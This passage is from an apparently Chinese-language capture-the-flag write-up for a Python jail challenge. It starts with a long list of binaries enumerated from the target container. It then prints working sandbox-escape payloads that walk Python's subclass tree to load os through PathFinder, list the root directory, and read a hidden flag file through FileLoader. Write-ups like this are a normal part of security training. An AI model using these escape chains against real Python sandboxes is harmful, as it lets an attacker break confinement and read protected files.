'dpkg-scansources', 'convert-im6', 'addr2line', 'gencat', 'x86_64-linux-gnu-gcov-dump', 'xzcmp', 'lzmore', 'X11', 'g++-10', 'fc-cache', 'gtester', 'x86_64-linux-gnu-ar', 'xzcat', 'x86_64-linux-gnu-as', 'dpkg-buildflags', 'import-im6', 'x86_64-linux-gnu-gcov', 'gdbus', 'strings', 'x86_64-linux-gnu-strings', 'dpkg-parsechangelog', 'display-im6.q16', 'convert', 'libpng-config', 'autoupdate', 'genbrk', 'genrb', 'composite', 'pkg-config', 'x86_64-linux-gnu-gcc-nm-10', 'objdump', 'dpkg-buildpackage', 'mysql_config', 'dpkg-source', 'conjure', 'x86_64-pc-linux-gnu-pkg-config', 'rpcgen', 'gresource', 'x86_64-linux-gnu-ld', 'aclocal', 'dpkg-architecture', 'cpp', 'gtester-report', 'dpkg-genbuildinfo', 'xzless', 'ranlib', 'display', 'dpkg-scanpackages', 'autom4te', 'montage', 'krb5-config', 'curl-config', 'x86_64-linux-gnu-g++-10', 'gcc-10', 'x86_64-linux-gnu-nm', 'x86_64-linux-gnu-addr2line', 'montage-im6.q16', 'fc-list', 'compare-im6.q16', 'gcc-nm', 'glib-genmarshal', 'x86_64-linux-gnu-gcc-10', 'dpkg-mergechangelogs', 'strip', 'file', 'x86_64-linux-gnu-g++', 'glib-mkenums', 'gdk-pixbuf-pixdata', 'x86_64-linux-gnu-ld.bfd', 'xz', 'c89', 'convert-im6.q16', 'zipgrep', 'm4', 'stream-im6.q16', 'lzcat', 'composite-im6.q16', 'animate-im6', 'g++', 'x86_64-linux-gnu-pkg-config', 'x86_64-linux-gnu-gcov-10', 'pcre-config', 'as', 'stream-im6', 'pcre2-config', 'fc-query', 'identify', 'gdbus-codegen', 'make-first-existing-target', 'x86_64-linux-gnu-gprof', 'glib-compile-resources', 'gcov-10', 'cc', 'identify-im6.q16', 'gprof', 'gcc-ranlib-10', 'x86_64-linux-gnu-cpp', 'x86_64-linux-gnu-objdump', 'mariadb_config', 'xzdiff', 'dh_autotools-dev_updateconfig', 'gcc', 'lto-dump-10', 'autoheader', 'aclocal-1.16', 'gcc-ar', 'gobject-query', 'gold', 'lzdiff', 'pg_config', 'dpkg-distaddfile', 'mariadb-config', 'cpp-10', 'x86_64-linux-gnu-gold', 'gendict', 'lzfgrep', 'libpng16-config', 'lzgrep', 'x86_64-linux-gnu-size', 'gmake', 'gsettings', 'xzegrep', 'lzcmp', 'gcov-tool-10', 'display-im6', 'autoconf', 'dpkg-gencontrol', 'dpkg-name', 'x86_64-linux-gnu-gcc-ranlib-10', 'fc-validate', 'compare', 'gcov-tool', 'xzgrep', 'gio', 'xzmore', 'glib-compile-schemas', 'gencnval', 'x86_64-linux-gnu-gcov-tool', 'xslt-config', 'icuinfo', 'uconv', 'compile_et', 'unxz', 'mogrify-im6.q16', 'libtoolize', 'ld', 'animate-im6.q16', 'dpkg-gensymbols', 'gdk-pixbuf-thumbnailer', 'autoscan', 'ifnames', 'ld.gold', 'lzless', 'ncursesw6-config', 'rsh', 'xsubpp', 'pwdx', 'perl5.32-x86_64-linux-gnu', 'svnbench', 'py3clean', 'sensible-browser', 'perlthanks', 'uptime', 'slogin', 'zipdetails', 'perlbug', 'svn', 'sensible-editor', 'lcf', 'pidwait', 'svnserve', 'py3compile', 'slabtop', 'piconv', 'ssh-keyscan', 'svnversion', 'pdb3', 'pydoc3', 'perldoc', 'ssh-copy-id', 'ucfq', 'svnauthz-validate', 'libnetcfg', 'ssh-argv0', 'ssh', 'python3.9', 'python3', 'py3versions', 'pod2html', 'git-upload-pack', 'git-shell', 'rlogin', 'svnsync', 'skill', 'pod2text', 'pgrep', 'json_pp', 'svndumpfilter', 'pl2pm', 'encguess', 'hg', 'pod2man', 'ptar', 'tload', 'pkill', 'cpan5.32-x86_64-linux-gnu', 'instmodsh', 'ucfr', 'watch', 'svnrdump', 'top', 'select-editor', 'ssh-add', 'w', 'splain', 'svnmucc', 'chg', 'ucf', 'pod2usage', 'pdb3.9', 'corelist', 'pydoc3.9', 'git-receive-pack', 'rcp', 'h2xs', 'podchecker', 'svnadmin', 'scp', 'streamzip', 'git', 'vmstat', 'pmap', 'pygettext3', 'ptardiff', 'snice', 'free', 'perlivp', 'svnauthz', 'shasum', 'hg-ssh', 'svnfsfs', 'pygettext3.9', 'ptargrep', 'h2ph', 'sensible-pager', 'svnlook', 'prove', 'cpan', 'enc2xs', 'sftp', 'ssh-keygen', 'ssh-agent', 'git-upload-archive', 'migrate-pubring-from-classic-gpg', 'gpgsm', 'pinentry-curses', 'dirmngr', 'c_rehash', 'gpgparsemail', 'wget', 'curl', 'gpgcompose', 'openssl', 'gpg', 'dirmngr-client', 'gpg-agent', 'gpgconf', 'gpg-zip', 'pinentry', 'kbxutil', 'gpgtar', 'watchgnupg', 'lspgpot', 'gpgsplit', 'gpg-connect-agent', 'gpg-wks-server']
```

但其實後來我回頭再看一下自己試過的結果
其中有一次是這樣

```
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/')
['tmp', 'sbin', 'run', 'dev', 'boot', 'root', 'proc', 'media', 'lib', 'var', 'home', 'mnt', 'srv', 'etc', 'usr', 'bin', 'lib64', 'sys', 'opt', '.dockerenv', 'flag_LwAyYvKd']
```

其實早就試出來了 我是小丑
所以就趕快把它decode出來

```
[cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader'][0]('foo', '/flag_LwAyYvKd/flag.txt').get_data('/flag_LwAyYvKd/flag.txt').decode()

```

就得到flag了
